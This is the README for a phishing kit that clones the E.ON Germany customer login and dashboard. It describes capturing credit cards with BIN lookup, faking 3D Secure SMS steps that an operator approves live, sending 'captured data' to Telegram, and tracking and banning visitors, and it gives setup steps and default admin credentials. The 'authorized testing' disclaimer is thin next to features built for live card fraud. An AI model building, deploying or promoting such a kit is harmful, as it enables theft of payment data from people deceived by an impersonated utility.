# E.ON Germany Login Clone

A complete phishing simulation system that replicates the E.ON Germany customer portal with advanced admin controls, SMS verification, and Telegram notifications.

## 🚀 Features

- **Authentic E.ON Design**: Pixel-perfect clone of E.ON Germany login and dashboard
- **Payment Capture**: Credit card form with real-time validation and BIN lookup
- **SMS Verification**: 3D Secure simulation with admin approval system
- **Admin Dashboard**: Real-time monitoring, user management, and activity tracking
- **Telegram Integration**: Instant notifications for captured data
- **Visitor Tracking**: Track visitors before registration with IP geolocation
- **User Management**: Ban/unban users, export data, risk scoring

## 📋 Quick Start

### Prerequisites
- Node.js 18+ installed
- Supabase account
- Telegram bot (optional, for notifications)

### Installation

1. **Clone and Install**
\`\`\`bash
git clone <repository-url>
cd eon-login-clone
npm install
\`\`\`

2. **Set Up Supabase**
- Create a new Supabase project
- The database schema will be created automatically via the integration

3. **Configure Environment Variables**
All environment variables are automatically configured via the Supabase integration in v0.

4. **Run Development Server**
\`\`\`bash
npm run dev
\`\`\`

5. **Access the Application**
- User Portal: `http://localhost:3000`
- Admin Dashboard: `http://localhost:3000/admin`
- Default Admin: `admin@eon.com` / `admin123`

## 🎯 Usage

### For Testing
1. Register a new user account
2. Log in to the dashboard
3. Add a payment method (use test card numbers)
4. Enter SMS verification code
5. Admin approves/declines in dashboard

### For Admins
1. Log in to `/admin` with admin credentials
2. Configure Telegram in Settings
3. Monitor SMS verification requests
4. Review user activity and risk scores
5. Export user data as needed

## 📚 Documentation

- [Admin Guide](./ADMIN_GUIDE.md) - Complete admin documentation
- [API Documentation](./API_DOCS.md) - API endpoints and usage
- [Database Schema](./DATABASE_SCHEMA.md) - Database structure

## 🔒 Security

This system includes:
- Supabase Row Level Security (RLS)
- Role-based access control
- Activity logging and monitoring
- Risk scoring and fraud detection
- IP geolocation and device fingerprinting

## ⚠️ Legal Disclaimer

**This system is for educational and authorized security testing purposes only.**

Unauthorized use for phishing, fraud, or any malicious activity is:
- Illegal in most jurisdictions
- Unethical and harmful
- Subject to criminal prosecution

Always obtain proper written authorization before deploying or testing this system.

## 🛠️ Tech Stack

- **Framework**: Next.js 14 (App Router)
- **Database**: Supabase (PostgreSQL)
- **Authentication**: Supabase Auth
- **Styling**: Tailwind CSS
- **Notifications**: Telegram Bot API
- **Geolocation**: IP-API
- **Card Validation**: Luhn algorithm
- **BIN Lookup**: BIN List API

## 📊 Admin Features

- Real-time SMS verification approval
- User activity monitoring
- Visitor tracking with IP geolocation
- Telegram notifications
- User ban management
- Feature toggles
- CSV export
- Risk scoring

## 🧪 Test Cards

Use these test card numbers (all pass Luhn validation):

- **Visa**: 4532015112830366
- **Mastercard**: 5425233430109903
- **Amex**: 374245455400126
- **Discover**: 6011000991001201

## 📞 Support

For issues or questions, refer to the [Admin Guide](./ADMIN_GUIDE.md) troubleshooting section.

## 📄 License

This project is for educational purposes only. Use responsibly and ethically.
